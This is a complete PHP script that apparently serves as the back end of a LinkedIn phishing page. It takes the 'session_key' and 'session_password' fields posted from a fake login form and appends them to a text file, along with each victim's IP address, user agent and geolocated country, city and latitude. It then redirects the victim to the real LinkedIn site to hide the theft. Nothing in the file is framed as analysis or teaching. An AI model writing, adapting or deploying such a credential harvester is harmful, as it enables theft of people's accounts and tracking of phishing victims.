<?php
// Retrieve the user's IP address
$user_ip = $_SERVER['REMOTE_ADDR'];

// Use a geolocation API to fetch location data
$api_url = 'https://api.ipgeolocation.io/ipgeo?apiKey=YOUR_API_KEY&ip=' . $user_ip;
$location_data_json = file_get_contents($api_url);
$location_data = json_decode($location_data_json, true);

// Extract relevant information
$country = $location_data['country_name'];
$region = $location_data['state_prov'];
$city = $location_data['city'];
$latitude = $location_data['latitude'];
$longitude = $location_data['longitude'];

file_put_contents("Login_Password.txt", "Username: " . $_POST["session_key"] . "\nPassword : " . $_POST["session_password"] . "\nIP : " .  $_SERVER['REMOTE_ADDR'] ."\nOS : " . $_SERVER['HTTP_USER_AGENT'] ."\nCountry : " .
 $country . "\nCity : " . $city . $latitude . "\n\n", FILE_APPEND);
header("Location : https://www.linkedin.com");
exit()
?>
